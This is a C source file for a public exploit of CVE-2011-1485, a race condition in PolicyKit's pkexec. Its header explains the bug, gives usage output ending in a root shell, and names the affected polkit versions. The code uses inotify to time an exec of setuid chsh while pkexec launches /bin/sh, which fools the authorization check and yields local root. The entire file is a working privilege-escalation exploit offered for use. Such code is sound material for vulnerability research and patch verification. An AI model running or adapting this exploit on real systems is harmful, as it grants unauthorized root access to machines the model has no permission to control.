/* polkit-pwnage.c
 *
 *
 * ==============================
 * =      PolicyKit Pwnage      =
 * =          by zx2c4          =
 * =        Sept 2, 2011        =
 * ==============================
 *
 *
 * Howdy folks,
 *
 * This exploits CVE-2011-1485, a race condition in PolicyKit.
 * 
 * davidz25 explains:
 * 
 * --begin--
 * Briefly, the problem is that the UID for the parent process of pkexec(1) is
 * read from /proc by stat(2)'ing /proc/PID. The problem with this is that
 * this returns the effective uid of the process which can easily be set to 0
 * by invoking a setuid-root binary such as /usr/bin/chsh in the parent
 * process of pkexec(1). Instead we are really interested in the real-user-id.
 * While there's a check in pkexec.c to avoid this problem (by comparing it to
 * what we expect the uid to be - namely that of the pkexec.c process itself which
 * is the uid of the parent process at pkexec-spawn-time), there is still a short
 * window where an attacker can fool pkexec/polkitd into thinking that the parent
 * process has uid 0 and is therefore authorized. It's pretty hard to hit this
 * window - I actually don't know if it can be made to work in practice.
 * --end--
 *
 * Well, here is, in fact, how it's made to work in practice. There is as he said an
 * attempted mitigation, and the way to trigger that mitigation path is something
 * like this:
 *
 *     $ sudo -u `whoami` pkexec sh
 *     User of caller (0) does not match our uid (1000)
 *
 * Not what we want. So the trick is to execl to a suid at just the precise moment
 * /proc/PID is being stat(2)'d. We use inotify to learn exactly when it's accessed,
 * and execl to the suid binary as our very next instruction.
 *
 * ** Usage **
 * $ pkexec --version
 * pkexec version 0.101
 * $ gcc polkit-pwnage.c -o pwnit
 * $ ./pwnit 
 * [+] Configuring inotify for proper pid.
 * [+] Launching pkexec.
 * sh-4.2# whoami
 * root
 * sh-4.2# id
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
 * sh-4.2#
 *
 * ** Targets **
 * This exploit is known to work on polkit-1 <= 0.101. However, Ubuntu, which
 * as of writing uses 0.101, has backported 0.102's bug fix. A way to check
 * this is by looking at the mtime of /usr/bin/pkexec -- April 22, 2011 or
 * later and you're out of luck. It's likely other distributions do the same.
 * Fortunately, this exploit is clean enough that you can try it out without
 * too much collateral.
 *
 *
 * greets to djrbliss and davidz25.
 *
 * - zx2c4
 * 2-sept-2011
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/inotify.h>

int main(int argc, char **argv)
{
	printf("=============================\n");
	printf("=      PolicyKit Pwnage     =\n");
	printf("=          by zx2c4         =\n");
	printf("=        Sept 2, 2011       =\n");
	printf("=============================\n\n");

	if (fork()) {
		int fd;
		char pid_path[1024];
		sprintf(pid_path, "/proc/%i", getpid());
		printf("[+] Configuring inotify for proper pid.\n");
		close(0); close(1); close(2);
		fd = inotify_init();
		if (fd < 0)
			perror("[-] inotify_init");
		inotify_add_watch(fd, pid_path, IN_ACCESS);
		read(fd, NULL, 0);
		execl("/usr/bin/chsh", "chsh", NULL);
	} else {
		sleep(1);
		printf("[+] Launching pkexec.\n");
		execl("/usr/bin/pkexec", "pkexec", "/bin/sh", NULL);
	}
	return 0;
}